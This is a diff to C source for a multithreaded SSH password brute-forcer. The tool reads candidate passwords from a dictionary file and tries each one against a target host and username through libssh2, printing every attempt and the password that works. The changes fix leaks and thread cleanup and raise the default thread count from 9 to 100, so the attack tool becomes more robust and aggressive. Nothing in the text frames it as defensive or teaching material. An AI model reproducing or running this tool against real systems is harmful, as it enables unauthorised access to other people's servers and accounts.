@@ -43,28 +43,34 @@ status_t bruteforce_core (line_t (*the_password), void* _data)
 {
 	bruteforce_data_t* data = _data;
 	status_t status = success ();
+	bool found = false;
 
 	line_t line;
 	status = make_line (&line);
 	if (failed (status))
-		return status;
+		goto core_exit;
 	(*the_password) = line;
+	pthread_cleanup_push (&free_line, &line);
 
-	while (1) {
+	while (!found) {
 		int eof = 0;
 
 		// Get the next password
-		if (pthread_mutex_lock (&data->dict_mutex) != 0)
-			return failure ("Failed to lock dictionary mutex");
+		if (pthread_mutex_lock (&data->dict_mutex) != 0) {
+			status = failure ("Failed to lock dictionary mutex");
+			goto free_line;
+		}
 		{
 			status = get_line (&line, data->dict_file);
 			eof = feof (data->dict_file);
 		}
-		if (pthread_mutex_unlock (&data->dict_mutex) != 0)
-			return failure ("Failed to unlock dictionary mutex");
+		if (pthread_mutex_unlock (&data->dict_mutex) != 0) {
+			status = failure ("Failed to unlock dictionary mutex");
+			goto free_line;
+		}
 
 		if (failed (status) || eof)
-			return status;
+			goto free_line;
 
 		// Open a connection
 		int ssh_socket;
@@ -96,8 +102,10 @@ status_t bruteforce_core (line_t (*the_password), void* _data)
 		// Send the password
 		const char* password = line.ntbs;
 		printf ("Trying \"%s\"\n", password);
-		if (libssh2_userauth_password (session, data->username, password) >= 0)
+		if (libssh2_userauth_password (session, data->username, password) >= 0) {
 			(*the_password) = line;
+			found = true;
+		}
 
 	disconnect:
 		pthread_cleanup_pop (1);
@@ -112,6 +120,11 @@ status_t bruteforce_core (line_t (*the_password), void* _data)
 			goto retry;
 		}
 	}
+
+free_line:
+	pthread_cleanup_pop (!found);
+core_exit:
+	return status;
 }
 
 void* bruteforce_thread (void* _data)
@@ -193,14 +206,13 @@ status_t bruteforce (line_t (*password), const char* address, const char* userna
 	done:
 		for (int i = 0; i < nthreads; ++i) {
 			pthread_cancel (threads [i]);
-			if (pthread_join (threads [i], NULL) != 0) {
+			if (pthread_join (threads [i], NULL) != 0)
 				status = failure ("Failed to join bruteforce thread");
-				goto done;
-			}
 		}
+		free (threads);
 	}
 	if (pthread_mutex_unlock (&data.done_mutex) != 0)
-		return failure ("Failed to unlock \"done\" mutex");
+		status = failure ("Failed to unlock \"done\" mutex");
 	if (failed (status))
 		return status;
 
@@ -257,9 +269,9 @@ int main (int argc, const char* const* argv)
 	const char* address = NULL;
 	const char* username = NULL;
 	const char* dict_filename = NULL;
-	int nthreads = 9;
+	int nthreads = 100;
 	check (get_args (&address, &username, &dict_filename, &nthreads, argc, argv),
-	       "Usage: sshpass address username dict_file [threads=9]");
+	       "Usage: sshpass address username dict_file [threads=100]");
 
 	FILE* dict_file = fopen (dict_filename, "r");
 	raw_check (dict_file != NULL, "Could not open %s for reading", dict_filename);
@@ -270,6 +282,7 @@ int main (int argc, const char* const* argv)
 
 	printf ("Password: %s\n", password.ntbs);
 
+	free_line (&password);
 	fclose (dict_file);
 	return EXIT_SUCCESS;
 }
